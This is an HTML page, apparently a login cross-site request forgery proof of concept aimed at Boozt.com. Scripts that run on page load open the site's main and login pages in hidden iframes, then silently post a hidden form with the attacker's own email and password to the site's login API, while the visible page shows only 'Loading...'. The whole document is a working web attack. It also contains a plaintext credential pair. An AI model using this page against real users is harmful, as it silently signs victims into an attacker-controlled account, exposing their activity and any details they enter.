<!DOCTYPE html>
<html>
<head>
    <script>
        function step1_visitMainPage() {
            // Open Boozt.com's main page in an iframe (to set necessary cookies)
            var iframe = document.createElement("iframe");
            iframe.src = "https://www.boozt.com/";
            iframe.style.display = "none";
            document.body.appendChild(iframe);

            // Wait a few seconds, then proceed to login page
            setTimeout(step2_visitLoginPage, 10000);
        }

        function step2_visitLoginPage() {
            // Open the login page in an iframe to ensure correct navigation flow
            var iframe = document.createElement("iframe");
            iframe.src = "https://www.boozt.com/login"; 
            iframe.style.display = "none";
            document.body.appendChild(iframe);

            // Wait a few seconds, then submit my [as an attacker] credentials
            setTimeout(step3_submitLoginForm, 10000);
        }

        function step3_submitLoginForm() {
            var form = document.createElement("form");
            form.method = "POST";
            form.action = "https://www.boozt.com/api/login";

            var email = document.createElement("input");
            email.type = "hidden";
            email.name = "email";
            email.value = "iqbalup18@gmail.com"; // my email

            var password = document.createElement("input");
            password.type = "hidden";
            password.name = "password";
            password.value = "6115Isayevm"; // my password

            var remember = document.createElement("input");
            remember.type = "hidden";
            remember.name = "remember_me";
            remember.value = "true";

            form.appendChild(email);
            form.appendChild(password);
            form.appendChild(remember);

            document.body.appendChild(form);
            form.submit();
        }

        // Start the full navigation process on page load
        window.onload = step1_visitMainPage;
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
